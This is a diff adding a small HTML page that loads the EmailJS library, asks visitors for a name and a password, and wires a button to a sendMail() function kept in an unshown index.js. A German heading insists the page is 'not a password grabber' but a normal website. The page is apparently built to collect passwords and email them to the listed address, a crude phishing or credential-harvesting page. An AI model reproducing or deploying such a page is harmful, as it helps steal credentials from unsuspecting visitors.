@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="style.css">
+    <script
+    type="text/javascript"
+    src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"
+  ></script>
+  <script type="text/javascript">
+    (function () {
+      emailjs.init({
+        publicKey: "y26d5RGj3HqhCDXja",
+      });
+    })();
+  </script>
+
+</head>
+<body>
+    <script src="index.js"></script>
+    <h1>KEIN PASSWORD GRABBER!!! SONDERN GANZ NORMALER WEBSEIT!!</h1> <br> <br> <br>
+    <p id="email">ad@dehrendorf.com</p>
+
+    <label>Name</label> <br> <br>
+    <input type="text" id="name"> <br> <br>
+    <label>Password</label> <br> <br>
+    <input type="text" id="pasword"> <br> <br>
+    <input type="button" onclick="GetName(), sendMail()">
+
+</body>
+</html>
